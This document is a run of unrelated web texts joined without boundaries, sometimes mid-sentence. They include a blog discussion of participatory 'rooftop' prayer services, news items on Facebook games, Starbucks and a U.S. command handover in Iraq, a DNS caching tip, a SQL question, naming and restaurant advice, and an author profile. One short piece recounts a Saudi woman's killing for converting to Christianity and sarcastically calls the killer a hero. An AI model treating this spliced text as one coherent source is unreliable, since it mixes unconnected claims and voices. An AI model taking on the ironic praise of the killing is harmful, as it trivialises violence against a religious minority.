Ironically, the necessity that everyone be in sync only pertains to the supposedly structureless rooftop style, because everyone has the right and responsibility to lead parts of the service, and therefore everyone has to be aware of where everyone else is. In a conventional minyan, only the leader (and perhaps a critical mass of participants) has to be maintaining the tempo of the service; everyone else can go freely at their own pace.
3) Macroscopic liturgy mismatch. The group needs to agree beforehand on the rules of the road, in particular on assumptions about whether or not the service is full-liturgy. If some people assume that it is, and other people assume that it isn't and jump ahead and start things further along, then that's not cool. And even if the group agrees that the service doesn't have to be full-liturgy and skipping is ok, if I jump ahead to prayer #9 and you had something you wanted to do for prayer #8, then that's still not cool.
As I see it, there are three options that allow for democratic (but not chaotic) leading: a) full liturgy (and, of course, the group agrees on whether this means Ashkenazi, Sephardi, etc. -- they differ vastly for pesukei dezimrah); b) non-full liturgy, in which everyone agrees in advance on which prayers will be included (or, equivalently, everyone agrees to follow the same siddur); and c) non-full liturgy, in which any departures (or at least deletions; insertions shouldn't be an issue) from the full liturgy require asking for consent ("Is it ok if I skip to prayer #9?" "No, wait! I had something for #8!").
4) Too many people, or an uncohesive group. Rooftop works best with a small group of people who know each other, and who ideally have experience davening together and a common frame of reference. Among unfamiliar people, people will feel inhibited about stepping up and starting something. Among a group above a certain size (analogous to the rule of 150, but much smaller), people will feel inhibited and won't feel a sense of responsibility for jumping in because the group is large enough that someone else can do it. (Insisting that rooftop groups be less than a minyan is a useful rule of thumb, but not strictly applicable all the time. I've been to rooftop services that had a minyan and worked successfully, and rooftop services that had less than a minyan that fell flat.)
5) The guest list. Even worse than an inhibited service where no one takes initiative: Because everyone at a rooftop gathering is fully empowered, someone who doesn't understand the group or doesn't understand when enough is enough has the power to wreck it for everyone. This is why I've never been to or heard of a rooftop service that was announced in a public forum; they're always by invitation only (though the answer to "Can I bring a friend?" is usually "yes").
6) Confusion. By its nature, rooftop is best suited for people with a strong familiarity with the liturgy. That in itself isn't a flaw; no davening style is for everyone. But, unlike other genres that are also best suited to a similar crowd (in which the worst-case scenario is that someone won't be into it), this can lead to spectacular flameouts. In rooftop, someone might make a major error (e.g. starting entirely the wrong prayer -- similar to scenarios discussed in #3 above, but unintentional), of the sort that wouldn't happen in a minyan with a leader where the leader prepared beforehand, leading to awkward interpersonal situations. The group has to make a spontaneous decision about whether to say something or to roll with it. Saying something is problematic, because of the "anything goes" atmosphere of rooftop (especially if ground rules haven't been laid down as in #3 above), and the distributed nature of leadership (whose role is it to say something?), and the possibility of personal embarrassment. But rolling with it is also problematic, because the group has to spontaneously come up with a graceful way to smooth things over logistically (again, difficult when leadership is distributed), and the possibility of personal embarrassment still exists if the person in question figures out what happened.
7) Friday night. There is a common line of thinking that if we can do rooftop for Saturday morning, then kal vachomer we can do rooftop for Friday night. This line of thinking goes like this: If we can do rooftop for pesukei dezimrah, when we ordinarily don't sing that much and coming up with creative material is a challenge, it should be much easier to do rooftop for kabbalat shabbat, when we always sing a lot and everyone is very familiar with kabbalat shabbat and knows lots of tunes. If we can do rooftop on Shabbat morning, when there's not otherwise a culture of pickup apartment minyanim, kal vachomer we can do rooftop on Friday night, when there is a strong culture of pickup apartment minyanim.
I think this thinking is flawed, and Friday night rooftop's supposed strengths are actually its weaknesses.
Because everyone knows lots of tunes for each unit of kabbalat shabbat, this paradoxically inhibits people from coming forward. Jumping in with something you just thought of for Psalm 33 (in pesukei dezimrah) has no cost, because if you hadn't done it, no one else would have done anything for it, whereas you're going to feel like you have to be damn sure of yourself before you start anything for Lecha Dodi. And there are some tunes that are relatively "standard" (in the sense that they're the default), but not completely so (because there are alternatives), for example, the Carlebach Psalm 96. And so no one wants to be That Guy (or Gal) and start up the "standard" tune when there are other alternatives, leading occasionally to the improbable result of doing Psalm 96 silently. (In a milieu where the standard tunes are completely standard, e.g. straight government-issue Carlebach, Friday night rooftop is smoother, but is also pointless. If everyone knows what's going to happen, then what difference does it make if one person is leading it or everyone is?)
Because kabbalat shabbat is often entirely or mostly sung, it benefits from having a leader who can think in advance about the overall plan and ensure an appropriate balance between upbeat and mellow, between singing and (if desired) not-singing, between "standard" melodies and new ones, and who can create smooth transitions between prayers for a seamless flow. Rooftop services are spontaneous and disjointed by nature; they have no advance plan and (other than in exceptionally awesome cases) no coherent flow. That's true for Shabbat morning rooftop also, but no one has any expectations of coherent flow for pesukei dezimrah, so nothing is lost.
8)"Let's just do rooftop." This is another problem characteristic of Friday night rooftop. Shabbat morning rooftop is so different from a typical Shabbat morning minyan that if you're doing it, you know you're doing rooftop. In contrast, because there is already a culture of informal Friday night apartment minyanim, rooftop looks superficially similar to a conventional minyan, and the differences are easy to overlook. But we overlook these differences to our peril.
A common scenario is "Ok, I'm having a bunch of people over for dinner. Where should we daven? Let's just daven in the apartment. [no problem so far] How should we daven? Let's just do rooftop." In this scenario, sometimes the participants are informed in advance, and sometimes they find out when they arrive. In both cases, there may be participants who are just finding out what "rooftop" is. In the latter case (no advance notice), participants are not psychologically prepared for a service that they're all responsible for making happen (they've just gotten to the end of a long week and thought all they had to do was show up), and so people are reticent to take initiative. And it's even worse for people who show up late and miss the "We're doing rooftop" announcement, and thus don't even know that they're authorized to take initiative.
Even if participants know in advance that it's going to be rooftop, it is a mistake for the host/convener to simply say "Let's do rooftop" and assume that everything will magically sort itself out. As outlined above, there needs to be a pacesetter (yes, even for kabbalat shabbat -- as discussed, one can't assume that kabbalat shabbat will be free of awkward silences), and there also have to be a committed core of people who are sold on the idea of doing rooftop and not merely showing up to someone else's event.
9) Decision points. One time I went to a Friday night rooftop service. We reached the end of kabbalat shabbat, and then someone immediately started up with ma'ariv. I think this was a breach of etiquette. They shouldn't have gone ahead without seeking the consent of the group and/or the host. When kabbalat shabbat came to an end, the group and/or the host should have actively made a decision about whether to continue rooftop-style for ma'ariv, to have a conventionally-led ma'ariv, to say that anyone who wants can have a few minutes to do ma'ariv on their own, or to go straight to dinner. And these decisions need to be made explicitly by the group or an empowered individual at each major decision point (or in advance), rather than one participant deciding unilaterally on the group's behalf.
***
So that's all I have for now. In your experience, what are some other pros and cons of rooftop? What ways have you found to achieve the pros while neutralizing the cons? When is rooftop worth the risks?
I think #8 is a big one. Because rooftop can be so wonderful when done well, and seem so effortless to achieve that, people often think that "let's just do rooftop" means an easy, no effort solution.
I'm glad you've taken the time to post this, BZ. Hopefully folks will read through it and realise that "even rooftop" takes preparation and thought!
I would also add #10: the host/"sheliach tzibbur of last resort" should check in at the very beginning to make sure participants are all on the same page. And then should remain with the group throughout! Sure, everyone needs a washroom break from time to time, but if you're the host/"sheliach tzibbur of last resort," you should return quickly in case there was awkward silence or panicked singing through.
I never even knew what "Rooftop" was when i started reading this, but now i realize i've done it once (for Friday Night Ma‘ariv)... and it worked pretty good.
Part of what made it work well was that a few people who really wanted to introduce tunes to the group called it before we even started — which does lower the improvisational rooftop atmosphere that you've described, but it does help everything run smoothly with less awkward silences or conflict between people who both try to start something at the same time.
I prefer the idea of "Populist" davening — distributed among the participants like Rooftop, except pre-planned. I've done this for Qabbalat Shabbat (and i think you were there), as well as for Hallel one Rosh Hhodesh. I think it would work well for other tefilot, as well.
Last "rooftop" davenning I was at was at Desh's apt on July 4th. I think it was because we didn't have another place we wanted to go.
It went pretty well, if one doesn't mind some massive giggling fits when there was either an awkward silence, or people realizing too late that they were doing different alternatives to the same tune.
On second thought, the last one I went to was last Friday night. I think it worked pretty well, but I was tired enough that I don't remember much of that one.
The pace-setter idea is an interesting one...
i think another problem with such davvening is that, if you are really into it, your desire to do this well (and look good to others) as well as your anxiety either to participate or not screw everyone up, can take away your focus in prayer.
it's the result of having no arbitrary leader. now, everyone is a potential leader, a position that can be really inspiring, but also can be kinda anxiety ridden.
My experience with "rooftop" style davening (and I also had no idea it was called that) is that it was basically a very anxiety ridden experience - theres a pause, should I do something? am I leading too many? am i leading too few? aaahh! I can't pray at all. However, I was at a davening once which seemed to have many of the benefits without the cost of all that stress and distraction, and its also more accessible. All the prayers in the service were written on flashcards and an order was written out in front of the room (previously agreed upon), and people took the ones they wanted before we started. That way, prayers started from all around in a democratic manner, style and tune varied, etc. but also everyone knew what was going on at any given point in time, and what their responsibilities were. I highly recommend it.
An idea I've heard of that might help a rooftop-style service to self-organize with no pacesetter and no awkward silences would be to create a deck of cards naming parts of, or page numbers for, particular sections of the service. Depending on the level of comfort with liturgy of the group, they could either simply pass the deck around, with each person getting whatever they draw as their part to lead, or placing the deck on a table and giving everyone a chance to "snap up" the sections they'd like to lead. There'd still be a distributed, spontaneous quality to davening because different folks would lead each part, and who was next would be a surprise to everyone but one ... but without awkward pauses and with those jumping in having had a chance to give what they'd be leading at a least a little bit of thought in advance.
I really like jewtah's idea with the flashcards.
Someday, I'll have to try it.

The company revealed at a game developers conference in San Francisco on Wednesday that nearly a quarter of its active users (1.3 billion people) play a Facebook-connected game at least once a month on average.
Ever get frequent invites or requests from friends to play games with them? Well Facebook also stated that over 735 million of those type of game referrals are sent out every day.
Most of these stats are reportedly from a study Facebook conducted inside of the company in November of 2013 which had great revelations for game creators. Some of which could potentially be lucrative.
For example, there’s a financial incentive for game studios to make their games work on multiple platforms, which includes iOS, Android and Desktop. This is in addition to the fact that games will reach more eyeballs if released on those platforms.
According to Facebook, the average user who plays the same game across multiple platforms typically spends 3.3 times as much money on in-game purchases as people who only play on desktop.The lives of the prestigious members of the Commission for the Promotion of Virtue and the Prevention of Vice are not easy. All day they have to be on the alert, patrolling the streets of Saudi Arabia with an eagle eyes, tuned in the slightest hint of impropriety among the thankful Saudi populace.
But sometimes, the whiff of vice hits too close to home, and the results can be tragic.
In this case, one of our heroes, an upstanding member of the Muttawa, found out a terrible secret that his sister had been keeping from him:
She had converted to Christianity.
The woman, named Fatma Al-Matairi, confided in her brother about her terrible secret, secure in the knowledge that he would be understanding and supportive.
Little did the 26-year old know that her brother, as a member of the Commission, has a much higher moral code than just brotherhood and support. Converting to Christianity is blasphemy, and is punishable by death.
So he killed her.
Now, Saudi Arabia has one less blasphemer, and our hero can sleep well knowing he did the right thing.
UPDATE: It appears that it was her father that was a member of the Muttawa, and he cut out her tongue before burning her to death.This product is no longer available.

Starbucks has been toying with tea for a while, especially in India where tea is the hot brew of choice. But the announcement that the US coffee giant will buy Teavana Holdings, a tea-shop chain based in Atlanta, Georgia, sent Teavana shares surging more than 50% today.
So does this deal suggest Starbucks thinks tea’s time has finally come in the land of the latte? Starbucks has owned the Tazo tea brand since 1999, which it bought for $8.1 million and now brings in at least $1.4 billion a year in revenue, out of the company’s total of $13.3 billion. In a conference call back in April, an analyst did bring up tea, saying that “it continues to feel like a little bit of an untapped opportunity.”
But Starbucks Chief Executive Howard Schultz countered that he thinks “the medicinal qualities and the efficacy of tea will play a very large role in the overall category of health and wellness at Starbucks.” It was a less than full-throated forecast on growth in tea.
And probably for good reason. For one thing, Teavana itself has been looking outside of the US for growth, buying Canadian tea chain Teaopia back in May. Canadian per capita tea consumption is more than double that of the US, Teavana executives told analysts on a conference call outlining their plans to buy the chain. But Starbucks investors seem less than thrilled by the idea of depending for revenue growth on Canadians, however much tea they may drink: in contrast to Teavana’s huge bounce, Starbucks shares are down by more than 2%.N.

One Direction closed out their big 1D Day yesterday (Nov. 23) with a special guest — Michael Buble!
The Canadian crooner joined the band via satellite from a Las Vegas concert for a duet of ‘White Christmas.’ The self-proclaimed “Christmas prostitute” is infamous for his beautiful holiday tunes, and he was complemented as such by the British boys.
The performance was a stately closer to the band’s seven-hour streaming celebration, which also featured Jerry Springer, wrestler Kurt Angle and more.
However, the ensemble grew even further when the entire crew of the show joined in for a sing-along — and it happened only about thirty seconds into the performance! It didn’t sound quite as lovely with all those other non-professional voices in the mix, but it was still pretty cute to watch. A very merry time was had by all!Installation of the construction fence at the Conrad Hilton School of Hotel and Restaurant Management will begin on Wednesday, Nov. 7.
Phase 4 of the project will continue through Dec. 20 and involves work on the University grounds and basement level. Vaughn Construction will install a construction fence around the exterior areas affected by phase 4 in Lynn Eusan Park. A temporary path will be provided to connect the sidewalks surrounding the construction area.
University Drive will experience truck traffic during the excavation of the construction site for the installation of water tanks. During that time, flagmen will be posted to direct traffic.
See the picture below for more information on affected areas of the first floor and basement levels as well as the outside of the building.

The first wave of these novels will be out at some point in 2014 (and a few are already out). Participating in this process has been enlightening as manuscripts developed from outlines, to partials, to alpha drafts, to beta drafts, to finished products. In cases where an author brought me in at the beginning, the process has resulted in me reading a novel as many as four times or five times. There have been times my input has resulted in major changes to a novel. There are times the author has ignored my advice entirely. In the course of this process, I’ve learned some things about editing and how it works in publishing. Obviously, my experience on this issue is anecdotal and cannot begin to describe a pervasive picture of the state of editing in genre publishing. So, take this article with a grain of salt, but, please, don’t ignore it either.
One of the reasons I believe authors have approached me in such large numbers is because it becomes increasingly difficult to get feedback as a writer progresses in their career. One of the not-so-secrets in publishing is that a lot of second, third, fourth, et. al. novels are given only a very cursory editorial review (debuts are given more attention, but still not always at a level you might expect). I’ve even seen editorial letters from publishers that demonstrate a command of the novel without offering any critique beyond continuity and tensing errors. Of course, all books are copy edited, but an editor with a large list simply does not have the time to give a complete editorial review, or even sometimes a full read through, of a manuscript from an experienced mid-series author. Instead, more rigorous content edits are conducted at the literary agent level. Authors aren’t alone in putting their reputations behind their book. Agents do the same when they represent a novel to a publishing house. As a result, they are often much more inclined to dig into a novel and tear its heart out to get something they’re proud of and can sell. Of course, not all agents do this, positioning themselves more as negotiators and contract mavens than turd polishers (not that your manuscript is a turd).
All of that goes to say that true collaborative editorial relationships are becoming rarer. Editors, despite their titles, are becoming more about editorial direction–acquiring books–than working with an author from the beginning to put the best product on the shelves. That’s overly simplified, and should not diminish the work editors do, but it’s trending. Editors as gatekeepers more than collaborators, a hurdle to overcome not a trampoline to launch you over it, may soon be the reality not the myth. Some of the old timers will say that’s not how it always was, but declining staffs and an increased demand for books (read: cash flow) has led to rapidly expanding catalogs and stagnant budgets for staff with which to produce them. The author is more an island today than ever before.
Even an editorially inclined agent can only maintain that kind of tempo for so long with an author as more clients are added. Once a certain level of quality is attained, where’s the return on investment? And to a large degree, why should an editor or an agent invest precious resources (read: time) in something that probably won’t drastically impact a writer’s sales? After all, we all know how difficult it is for a mid-lister to become a best seller regardless of how good the books are. If the author has a proven track record and a consistent baseline of sales (even when those numbers are piss-poor, or especially when), those resources have to go elsewhere or may not be needed at all. This is certainly the case when an author disappoints with a first novel and the second novel finds itself with a much smaller print run merely to meet the contractual obligations before getting cut loose.
Authors I’ve become close with, through conventions or online, describe how challenging it can be to get (constructive) feedback. Many rely on their significant other as a primary critique, occasionally a best-writer-friend, their agent, or some combination thereof. Some have writing groups, but those are often focused on pieces of manuscripts and rarely an entire project. Some have no concept of the beta reader, particularly newer writers who don’t have a cadre of readers in their personal lives to draw from. Those who do have/use alpha/beta readers struggle to keep them. Reading a novel critically can be an arduous process that life often impedes. Not to mention many readers are incapable of a true critique for a wide range of reasons.
In other words, editorial feedback is a real commodity. Much harder to find in the publishing process than many imagine, it’s rare and sought after by authors, so much so that folks like Saladin Ahmed and Rose Fox have created a side business out of it, filling the gaps for authors who lack their own critical partners. I mention this because it seems odd that publishers out source some tasks they don’t have the resources to do themselves–copy editing, book design, distribution–but not (seemingly) the process of actually producing a better piece of fiction. I’ve even seen instances where a writer is discouraged from trying to grow, preferring instead that the author continue to produce exactly the same kind of novel as the previous.
I believe this is one of the reasons we’re seeing more authors interested in self publishing–the freedom to explore and grow. If a publisher isn’t invested in your growth as a writer, and by invested I mean actively helping you get better, is their value reduced? Listen to the discussion of why traditional-publishing and not-self-publishing, what are the reason you hear? Marketing and sales teams, distribution, and the occasional benefit of a gatekeeper to make sure the book doesn’t suck. I don’t think I’ve ever heard, because you’ll have an editor to take you to the next level. That isn’t something that gets talked about because it’s so hard to find that kind of situation. And I think that’s a problem.
Before I bring the holy wrath of publishing down on myself, let me be clear, there are absolutely editors at major presses who do provide crunchy editorial feedback. This isn’t a shot across the bow at them, but a pat on the back. I believe there’s a reason some houses are acquiring better talent than others and money is only part of it. However, it’s a trend I see heading in the wrong direction. Consider this a warning, a robot from the 1960’s waving his arms shouting, “Danger! Danger!”
If I were running a publishing house today, fully aware that my editors may not have the resources to dig into all the books they on their list, I would start looking to change. Not for more editors necessarily, because the financial realities of growing a full-time staff are legion, but for independent contractors. I would make damn sure that I’m not relying on agents, authors, and the nebulous beta reader to grow my list. I’d try to grow it myself. I would free my very capable editors to give attention to fewer titles, improving the level of discourse across the board. Right now you have publishing houses with two editors putting out nearly a book a week. Imagine the workload if there was major editorial work on every title? It’s an impossible task. So what happens?
The result, I hypothesize, is that polished work is more important than brilliant work. It’s why we see so many of the same things published again and again. While the desirability of proven commodities (i.e. — assassins! vampires! angry trousers!) is sales driven, I believe it’s a symptom of an ever shrinking supply of editorial hours. And the only way to improve the landscape is bring back the kinds of collaborative relationships between editor and author. This kind of relationship seems more prevalent in the short fiction markets where the length of work makes the relationship more feasible. Shouldn’t that be the norm at novel length too?
Because leaving an author flailing in the wind, hoping their sails catch without a lesson on on how to work the jib, seems counterproductive and only diminishes the quality of the product. If we want the next generation to read more than the previous one, it will require that we continue to grow new writers and new perspectives and not simply rely on what’s worked before. If that’s something publishing wants too, then they need to invest in it.By Sgt. Sara Wood, USAAmerican Forces Press Service
WASHINGTON, Feb. 12, 2007 Acknowledging the challenges ahead and pledging full effort, Army Gen. David H. Petraeus took the helm of the top U.S. command in Iraq on Feb. 10 in Baghdad.
Petraeus, who was promoted to general just before the change-of-command ceremony, assumed command from Army Gen. George W. Casey Jr., who has led Multinational Force Iraq since July 2004. Petraeus previously commanded the U.S. Army Combined Arms Center and Fort Leavenworth, Kan. Casey is set to become the next Army chief of staff.
“This morning's ceremony truly is a humbling experience for me, and the challenges ahead are substantial,” Petraeus said after officially taking command. “The rucksack of responsibility is very heavy. In truth, it is too heavy for any one person to bear, and we will all have to share the burdens and move forward together. If we can do that and if we can help the people of Iraq do likewise, then the prospects for success are good.”
Petraeus thanked Casey for his leadership and sacrifices, and pledged to give the servicemembers and civilians of MNFI the best leadership and direction he can provide. The coalition’s job in the coming months will be to work with Iraqi forces to improve security so the Iraqi government can resolve economic issues and improve basic services, he said.
“The way ahead will be hard, and there undoubtedly will be many tough days,” Petraeus said. “As I recently told the members of the United States Senate, however, ‘hard’ is not ‘hopeless’; indeed, together with our Iraqi partners, we can and we must prevail.”
In relinquishing command, Casey noted the progress Iraq has made since it achieved its sovereignty. After the fall of Saddam Hussein, Iraqis were totally dependent on the coalition for security, he said. Now, through the unwavering support of the Iraqi people and security forces and coalition forces, Iraq is on the verge of taking responsibility for its own security by the end of this year, he said.
“The past that brought us to this point has not been easy, but it has been part of a concerted effort to build an Iraq that can secure, sustain and govern itself,” Casey said. “Freedom isn't free, and it never has been. It happens through blood, sweat and determination, and you have brought all of those things to this fight.”
Casey said the challenge of overcoming sectarian violence and building a representative government is one the coalition can help with, but that will ultimately rest on the shoulders of the Iraqis themselves. He said he is optimistic about the future of Iraq because he believes in the inherent desire of all people to live in freedom. The general added that he sees Iraqis taking charge of their future.
Casey also expressed confidence in the competence and professionalism of the men and women of the coalition. “You are the best fighting force in the world, and you bring intellect, drive, compassion, courage and commitment to this mission,” he said. “I see it every day in the conduct of your duties, and I also have growing confidence in the men and women of the Iraqi security forces. And I have no doubt that they will emerge over the coming years as the dominant security forces in Iraq.”
Army Gen. John Abizaid, commander of U.S. Central Command, noted Casey’s many accomplishments while commanding in Iraq, such as facilitating national elections, combat actions, building institutions, and developing leaders.
“Thank you for your calm, professional leadership, for your toughness, for your wise counsel to those both above and below your level of command,” Abizaid said to Casey. “Most important, thank you for your patient support of a great people in their new destiny. History will smile upon your accomplishments.”
Abizaid also spoke about the challenges facing Iraq. No nation in the modern age can allow murderers and terrorists to kill without remorse or intimidation, torture and extortion to rule above the law, he said. Sectarian violence and division have no place in the future of Iraq, a nation that is great because of its ability to overcome ethnic and religious differences, he said.
“Stand together and take your rightful place in the modern world,” Abizaid said to the Iraqi leaders at the ceremony. “The United States and the international community stand ready to assist you, but the choice between violence and prosperity can only be made by you. Let all of us work together to build the new Iraq. Let Iraq claim its rightful place as a nation of strength and justice for all of its citizens.”

Epidemiology Section works closely with the Georgia Public Health Laboratory, the Environmental Health Section, and many of the Department’s prevention programs, as well as with District Epidemiologists in each of the 18 local District Health Offices. The District Epidemiologists function as front-line disease detectives working with their local communities to investigate outbreaks and provide assistance to prevent and control the spread of disease. The Epidemiology Section serves as Georgia’s epidemiology liaison to the national Centers for Disease Control and Prevention (CDC)
Major areas in which the Epidemiology Section conducts activities are:
- Acute Diseases
- Chronic Diseases
- Healthy Behaviors
- Emergency Preparedness and Response
- HIV/AIDS
- Hepatitis

Guys,
It is almost trivial to run your own dns caching server. Just a few
clicks in yast. And it really does not use that much ram / cpu. I
have it running on one of my servers with about 20 workstations
pointed at it.
It is currently only using 18megs of ram and about 75megs is paged out
to swap space. And that server has been up for 146 days, so this is
in the fully operational mode.
Assuming you have the ram to work with, if your ISP is unreliable for
dns services you should consider just running your own without even
forwarding requests to your ISP.
In a small business environment like mine, even if the ISP is reliable
you should be running your own local dns primary and backup caching
server. And they should be setup to forward requests that can't
answer locally to the ISPs dns server.
That way if you keep needing to lookup the same domain name
repeatedly, the traffic all stays within your local network. You only
have to ask the ISPs dns server for new info. And by using the
forwarding aspect, you get to leverage the fact the ISPs dns should
have a lot more info in its cache than your server does.
Thus the dns traffic on the internet is cutdown by having a couple
tiers of dns servers like that.
The only bad part is your local dns servers need to be machines that
run 24 hours a day, or at least any time a user might need to be doing
a dns query.
For a home user with a single suse box, this is easy. You just have
named (dns) start as a daemon during startup. And if you have a
reliable ISP dns server, forward unanswered requests to it. If it is
not reliable, then don't forward at all. That means unanswered
requests cause direct queries out to the various domain dns servers.
Note: I guess it is possible an ISP would firewall off outbound dns
requests, but I've never had that problem.

I think he has fabulous taste, as he picked my daughter's name... Autumn Grace. I love it and we have received so many compliments on it. Some issues that I wouldn't have thought of are that she often gets confused with either Amber or April. And we have even gotten some confused people hearing "Adam" before they see her.
For the other names
Huntleigh~ too close to your son's middle name of Hunter
Cabella~ although I think it has a lovely ring to it, I think that the connection to the Cabela store might be ground for teasing.
Sterling~ I think it's very masculine so I wouldn't personally use it.
Miranda~ I think this is a fabulous choice, very pretty
Adelyn~ I like this choice and the nn Addie. But I do prefer Addison more personally
Chyenne~ I think this fits the vibe that you are going for perfectlyCory works in Autodesk Research exploring cool, new things.

You’re sitting at a restaurant (hopefully one you discovered on scout.me), patiently waiting for your food, when after about 30 minutes your meal arrives.
Excited and hungry, you voraciously dig in. But just three-seconds into your meal, it hits you like a ton of bricks: This food isn’t right.
What’s the problem with your meal? It might be:
- It’s not what you ordered
- You asked for it without sauce or some other ingredient that is not easily taken out
- It’s not prepared correctly (over/under-cooked)
- There’s a foreign object in your food
So what do you do? Well, if you’re paying for a meal, there’s absolutely no reason it shouldn’t be done correctly. The restaurant is in the business of providing a great quality dining service and if it’s not up to your standards, you should let them know and send the food back, right?
Of course, the problem for most of us is, it’s not easy to send back food because it could lead to an awkward confrontation with your server. Maybe more than that, you really don’t want to make your server upset in fear you might end up with something extra in your meal.
So what do you do when you want to send your food back at a restaurant but don’t want to make your server mad? Here are some tips to make this awkward and unavoidable situation a little more palatable.
7 Magic Words You Need to Know When Sending Back Your Food
The first key to easily handling situations where you need to send food back is simple. Just remember these 7 words:
“I know it’s not your fault but…”
Why these words? Not shockingly, servers are just like any of us. They want to be treated politely, respectively, and with understanding. By approaching your server with these 7 words, you’re doing just that. Also, by letting them know that you don’t believe it’s their fault, you’re using language which will diffuse them and decrease the chances they’ll become defensive.
Be Specific
When you’re letting your server know there’s a problem with your order, you’ll also want to get very specific about what you’d like. This is also a great opportunity to ask any questions to help clarify your order and help set expectations for both you and the server.
Prevent Sending Food Back in the First Place
Want to avoid catastrophe at a restaurant? Many situations where you need to send food back can actually be easily avoided by just being proactive in your communication with your server before you place your order.
For example, if you don’t like sauces to the point where it’s actually a deal-breaker on ordering an item, you might want to let your server know that – even if it doesn’t mention it on an item’s description in the menu. As I know too well, many of these descriptions leave many items and ingredients out and letting your server know even preventatively could save you a lot of time and discomfort.
Now it’s your turn: Tell us your secrets to sending food back
Let’s be honest: Sending food back at a restaurant is really uncomfortable and at all costs, many of us would like to avoid these situations altogether. Unfortunately though, as long as there are restaurants, there are bound to be scenarios where for one reason or another an item needs to be sent back to the kitchen. When these situations do arise, hopefully, you’ll remember these tips for getting your food corrected simply and easily.
Did I miss anything? Do you have any secrets for handling these situations?
Let me know in the comments section below. And don’t forget, you can always discover new restaurants and places to eat by checking out scout.me.I need to compare all rows in a table and need to do some calculation on every comparison.
For eg: I have 3 users(a,b,c).I need to compare a->b and give some marks to b and insert this in another table and then a->c do the calculation and store in the above same table and then need to compare b->c and do the calculation and insert the calculated value to a table.then c->a,c->b,-a do same as above.
id,userid,lat,lng is the table structure. I need to return lat and lng in each comparison ( I mean When I do a user to user) and then assign a value to second user as described above.id is pk and userid will be a non repeat value and its unique .Basically while returning lat and lng I need to check the distance calculation for each users based on one to one comparison and giving marks based on the distance then storing these marks in another table based on the user id.
How can we do these kind of comparison ? should I Use cursor ? any other simple ways ?
I am able to write a simple join query like this but no idea how to do calculation and insert this into another table.
Select * from table t1 join table t2 on t1.userid!=t2.userid
Select * from table t1 cross join table t2
The cross join return you the entire records specified in both tables.But How can Find remaining calculation.This is where I got stuck....
I have done something like this
It doesn't meet my requirement but I am still tring to get the answer
SELECT *,(select CASE WHEN (CASE WHEN a.uid<b.uid THEN 0 ELSE 1 END)THEN 10 ELSE 9 END as isp
FROM testing a cross join testing b) as ordergp
testing
FROM testing c
It gives me a subquery multiple row error .
"the entire record" is what you get when you use the dreaded, evil SELECT *
the cross join is what you want, but only one join (two copies of the table), not two joins like you tried
if you have three users, a,b,c, then the cross join will give you --
a:aa:ba:cb:ab:bb:cc:ac:bc:c
if you add a WHERE condition, so that t1.uid <> t2.uid, then you will get the following --
a:ba:cb:ab:cc:ac:b
Thanks but stll trying to get the answer based on the distance.I need to find the distance and apply points to each user.I have created like this but not in correct way

I need to apply following points based on the distance
30 miles or less = 2 points 30 - 50 = 1 points 50 and up = 0 points

Elm Staff Writer
“I had written fantasy as a high school student,” said young adult writer Cynthia Hand. “I had always been interested in writing stories about teens…and I like the fantastical. You really should write what you like to read.”
Hand was the first speaker at the Rose O’Neill Literary House for Washington College’s spring series: Writing For and About Young Adults.
“While much of the programming at the Literary House focuses on underrepresented perspectives such as Jewish Voices [and] Writing in Wartime, other seasons are designed to acknowledge our students’ primary concerns and interests,” said Professor Jehanne Dubrow, director of the Rose O’Neill Literary House.
This season’s events will deal with young adult literature.
Hand was born in Idaho but now lives in southern California, where she teaches creative writing at Pepperdine University. She is the author of the “Unearthly” series and is currently working on another, more contemporary book.
“In the ‘Unearthly’ series, Hand tells the story of Clara, a teenage girl who’s part angel and who must discover her purpose, what we might describe as her calling or her reason for being on earth,” Dubrow said.
“Hand’s writing is clean, direct, elegant,” she added. “She creates a rich, textured back story, explaining how angels and humans first came together, what it feels like to be a fallen angel.”
Hand said she has been writing since she could first pick up a pen or pencil. She loved to write fantasy stories about aliens attacking an island of unicorns as well as fan fiction about “Star Wars” or “Star Trek.” English, though, was not Hand’s first choice for her studies. She attended the University of Idaho to earn a law degree, but she realized later in her education that she wanted to be a writer. She started applying for Master of Fine Arts programs, but she had to submit a short story, something she had never written.
“Everything that I had written was either super autobiographical…or it was fantasy,” Hand said.
She quickly wrote some stories, sent them off to several MFA programs, and was just accepted into Boise State University.
“I was really lucky to end up there because it is a really super program,” Hand said. Before at the University of Idaho, Hand’s creative writing experience had been more workshopping and less reading and theory. That was not the case at Boise State University, and it left Hand feeling very underprepared.
“I was the youngest [person in the program] at 22, and everyone else was at least 25 or 26, had life experience, all that stuff, and I had read nothing,” Hand said. “I had hardly written anything.”
Hand eventually developed a system for catching up with the rest of her classmates by writing down the names of authors they talked about and then reading them when she got home.
Hand went on to earn her Ph.D. at University of Nebraska-Lincoln around the same time Dubrow received hers in the same program.
“The Ph.D. was much more focused on understanding myself as a writer and sort of finding my place and my voice there,” Hand said. During her time in the program, Hand published her first short story and met her first agent and future husband, writer John Struloeff. He is the author of the poetry collection “The Man I was Supposed to Be.”
Hand said there are ups and downs to having a writer for a husband.
“The good part is that he is an amazing editor,” Hand said. He reads everything she writes and helps her with problems with her stories.
“The downside of it is we do struggle over who’s going to take care of the kids while the other one writes,” Hand said. It all comes down to whose writing is more important at the time.
“When I hit The New York Times, he was like, ‘Oh no, here we go,’” Hand said.
Hand is recognized for her fantasy-based “Unearthly” series, but the publishing industry is moving more toward contemporary literature.
“It’s hard for me because I have a temptation to write that stuff…my next novel is contemporary and I like it, but to write without anything sort of cool being in it, I don’t know,” Hand said. “I like the sort of mysterious and the fantastical.”
In writing her stories, Hand does a lot of research.
“I think it’s part of the fun,” she said. “I always keep a huge corkboard in my house where I pin up stuff I need for research.”
For the “Unearthly” series, Hand kept a map with details about the landscape, town, and streets. She did a vast amount of research on her setting, visiting Wyoming and even going to Jackson Hole High School to talk to the principal and students. She researched angel lore from several cultures, not just Judeo-Christian, as it turns out that many other religions have their own versions of angels.
“I got to sort of cherry pick from all that,” Hand said. “I would find different things I liked or different figures that I thought were interesting.”
When she started writing “Unearthly,” she had no idea her main character Clara was an angel. She did not even know she was writing young adult fiction. All she knew was that she was writing fantasy and that Clara was special in some extraordinary way.
Finally, Hand said, “I remembered this one little passage from the Bible that had always sort of blown my mind.”
“‘The Nephilim were on earth in those days— and also afterward— when the angels went to the daughters of men and had children by them. They were heroes of old, men of renown. (Genesis 6:4)’”
“The minute that I thought that being the solution to the problem, it all sort of beautifully came together, and the story kind of unrolled like a carpet that I just walked down,” Hand said.
